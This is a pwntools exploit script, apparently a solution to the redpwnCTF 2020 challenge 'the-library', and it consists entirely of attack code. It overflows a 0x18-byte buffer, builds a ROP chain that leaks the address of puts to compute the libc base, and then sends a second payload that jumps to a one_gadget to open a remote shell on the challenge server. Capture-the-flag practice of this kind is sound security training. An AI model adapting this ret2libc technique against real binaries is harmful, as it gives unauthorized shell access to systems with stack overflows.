from pwn import *

#r=process("./the-library")
r=remote("2020.redpwnc.tf",31350)
libc=ELF("./libc.so.6")
b=ELF("./the-library")
context.log_level='debug'

prdi=0x400733
oneshot=0x10a38c #0x4f2c5 0x10a38c

pay=""
pay+='x'*0x18
pay+=p64(prdi)
pay+=p64(b.got['puts'])
pay+=p64(b.plt['puts'])
pay+=p64(b.symbols['main'])

r.sendline(pay)

t=r.recvuntil("\x7f")[::-1]
t=t[:6]
t=t[::-1]
libcbase=u64(t.ljust(8,'\x00'))-libc.symbols['puts']

log.info(hex(libcbase))

oneshot+=libcbase

log.info(hex(oneshot))

pay2=""
pay2+='x'*0x18
pay2+=p64(oneshot)

r.sendline(pay2)

r.interactive()
